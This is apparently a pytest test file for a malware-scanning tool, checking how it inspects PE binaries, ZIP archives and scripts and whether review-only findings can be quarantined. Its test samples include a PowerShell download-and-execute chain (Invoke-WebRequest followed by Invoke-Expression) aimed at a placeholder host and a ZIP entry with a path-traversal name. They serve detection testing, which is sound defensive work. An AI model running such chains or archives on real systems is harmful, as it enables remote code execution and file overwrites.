from __future__ import annotations

import io
import json
import struct
import zipfile
from contextlib import redirect_stdout
from pathlib import Path

from zsec_shield.cli import EXIT_FINDINGS, main
from zsec_shield.content_inspection import inspect_content, inspect_pe, inspect_script, inspect_zip
from zsec_shield.scanner import Scanner


def _minimal_pe(*, section_flags: int = 0x60000020) -> bytes:
    value = bytearray(0x400)
    value[:2] = b"MZ"
    struct.pack_into("<I", value, 0x3C, 0x80)
    value[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", value, 0x84, 0x8664, 1, 0, 0, 0, 0xF0, 0x22)
    struct.pack_into("<H", value, 0x98, 0x20B)
    section = 0x98 + 0xF0
    value[section : section + 8] = b".text\0\0\0"
    struct.pack_into("<II", value, section + 16, 0x100, 0x300)
    struct.pack_into("<I", value, section + 36, section_flags)
    value[0x300:0x400] = b"A" * 0x100
    return bytes(value)


def _zip_with(name: str, payload: bytes = b"safe") -> bytes:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(name, payload)
    return output.getvalue()


def test_pe_metadata_and_writable_executable_sections_are_review_only() -> None:
    observations = inspect_pe(_minimal_pe(section_flags=0xE0000020), 0x400)
    assert [value["category"] for value in observations] == [
        "metadata",
        "writable_executable_sections",
    ]
    assert all(value["quarantine_eligible"] is False for value in observations)


def test_script_requires_conservative_combined_indicators() -> None:
    assert inspect_script(b"powershell Invoke-WebRequest https://example.invalid/file") == []
    observations = inspect_script(
        b"powershell Invoke-WebRequest https://example.invalid/file; Invoke-Expression $x"
    )
    assert [value["category"] for value in observations] == ["download_execute_chain"]
    assert observations[0]["quarantine_eligible"] is False


def test_zip_metadata_is_bounded_and_never_extracts_traversal_entry() -> None:
    archive = _zip_with("../../outside.txt")
    observations = inspect_zip(archive, len(archive))
    assert [value["category"] for value in observations] == ["metadata", "path_traversal"]
    assert all(value["quarantine_eligible"] is False for value in observations)


def test_dispatch_combines_only_applicable_providers() -> None:
    value = _minimal_pe()
    observations = inspect_content(value, len(value))
    assert observations[0]["provider"] == "pe"
    assert not any(item["provider"] == "archive" for item in observations)


def test_informational_metadata_does_not_turn_normal_pe_or_zip_into_review(
    tmp_path: Path,
) -> None:
    pe = _minimal_pe()
    archive = _zip_with("ordinary.txt")
    (tmp_path / "ordinary.exe").write_bytes(pe)
    (tmp_path / "ordinary.zip").write_bytes(archive)
    scanner = Scanner(())
    try:
        # Exercise the real path/broker boundary, not provider helpers alone.
        result = scanner.scan([tmp_path])
    finally:
        scanner.close()
    assert result.issues == []
    assert result.observations == []


def test_review_observation_cannot_be_quarantined_by_cli(tmp_path: Path) -> None:
    target = tmp_path / "review.ps1"
    state = tmp_path / "state"
    report = tmp_path / "report.json"
    target.write_text(
        "powershell Invoke-WebRequest https://example.invalid/file; Invoke-Expression $x",
        encoding="utf-8",
    )
    with redirect_stdout(io.StringIO()):
        result = main(
            [
                "--state-dir",
                str(state),
                "check",
                str(target),
                "--quarantine",
                "--report",
                str(report),
                "--json",
            ]
        )
    payload = json.loads(report.read_text(encoding="utf-8"))
    assert result == EXIT_FINDINGS
    assert payload["outcome"] == "review_observations"
    assert payload["scan"]["findings"] == []
    assert payload["scan"]["observations"]
    assert payload["quarantine"] == []
    assert target.is_file()
    assert not (state / "quarantine" / "entries").exists()
